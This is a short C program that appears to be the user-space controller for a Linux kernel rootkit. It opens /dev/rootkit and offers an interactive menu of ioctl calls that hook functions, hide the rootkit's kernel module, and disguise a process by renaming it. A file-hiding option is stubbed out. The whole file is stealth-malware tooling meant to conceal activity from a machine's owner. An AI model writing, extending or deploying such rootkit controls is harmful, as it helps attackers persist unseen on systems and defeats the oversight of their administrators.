#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include "rootkit.h"

int main(void)
{
    int fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    struct masq_proc masq = {
        .new_name = "tes",
        .orig_name = "test"};

    struct masq_proc_req req = {
        .len = 1,
        .list = &masq};

    while (1)
    {
        int choice;
        printf("Enter choice: ");
        scanf("%d", &choice);
        switch (choice)
        {
        case 0:
            close(fd);
            return 0;
            break;
        case 1: // IOCTL_MOD_HOOK
            ioctl(fd, IOCTL_MOD_HOOK);

            break;
        case 2: // IOCTL_MOD_HIDE
            ioctl(fd, IOCTL_MOD_HIDE);
            break;
        case 3: // IOCTL_MOD_MASQ
            if (ioctl(fd, IOCTL_MOD_MASQ, &req) < 0)
            {
                perror("ioctl");
                close(fd);
                return 1;
            }
            printf("Process masqueraded\n");

            break;
        case 4: // IOCTL_FILE_HIDE

            break;

        default:
            printf("Invalid choice\n");
            break;
        }
    }
    close(fd);

    return 0;
}